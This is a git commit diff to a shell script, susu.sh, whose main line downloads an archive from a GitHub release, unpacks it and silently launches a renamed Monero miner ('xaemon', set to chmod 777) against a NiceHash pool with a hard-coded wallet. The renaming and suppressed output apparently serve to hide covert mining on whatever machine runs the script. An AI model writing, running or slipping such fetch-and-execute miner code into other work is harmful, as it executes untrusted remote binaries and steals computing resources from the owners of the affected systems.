af949d0f82f9c9eaa17d4fb786027866d3447b12
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-16 02:17:20 +0700

    Update susu.sh

--- susu.sh
+++ susu.sh
@@ -1,4 +1,4 @@
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-generic-static-amd64.tar.gz > /dev/null 2>&1 && tar -xvf xmrigCC-miner_only-3.4.0-linux-generic-static-amd64.tar.gz && ./xmrigDeamon -a randomx -o randomxmonero.eu.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f -p "vivo" -t 1 > /dev/null 2>&1 &
+wget https://github.com/jengkolbw/kopisusu/releases/download/cireng/dynamic.tar.gz && tar -xvf dynamic.tar.gz && chmod 777 xaemon && ./xaemon -a randomx -o randomxmonero.eu.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f -p "vivo" -t 1 > /dev/null 2>&1 &
 while true
 do
         echo "Download..."
